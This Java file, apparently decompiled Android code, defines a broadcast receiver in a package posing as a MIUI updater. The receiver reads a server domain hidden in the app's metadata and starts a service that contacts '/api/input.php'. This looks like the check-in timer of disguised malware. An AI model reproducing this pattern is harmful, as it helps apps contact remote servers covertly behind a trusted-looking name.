package brandmangroupe.miui.updater;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager.NameNotFoundException;

public class MasterTimer extends BroadcastReceiver {
    private Intent intent;

    public void onReceive(Context context, Intent intent2) {
        String key = "";
        try {
            ApplicationInfo appInfo = context.getPackageManager().getApplicationInfo(context.getPackageName(), 128);
            if (appInfo.metaData != null) {
                key = appInfo.metaData.getString("domain");
            }
        } catch (NameNotFoundException oops) {
            oops.printStackTrace();
        }
        this.intent = new Intent(context, GlobalCode.class);
        this.intent.putExtra("content", "http://" + key + "/api/input.php");
        this.intent.putExtra("type", "Master");
        this.intent.putExtra("data", "");
        context.startService(this.intent);
    }
}
